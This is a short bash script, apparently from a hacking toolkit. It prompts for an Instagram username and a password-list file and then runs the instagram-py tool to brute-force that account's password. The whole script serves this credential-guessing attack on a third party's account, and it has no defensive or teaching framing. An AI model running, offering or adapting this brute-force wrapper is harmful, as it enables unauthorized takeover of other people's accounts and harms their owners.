#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
bash main/banner.sh
echo -e '\033[1;92m'
read -p "[#] User Name : " usrnm
echo -e '\033[1;92m'
read -p "[#] Enter Passlist Path : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "\033[1;92mExiting.........$rset"        
else

  instagram-py --username $usrnm --password-list $inspass

echo
sleep 1.0
cd $HOME
fi
sleep 4.0
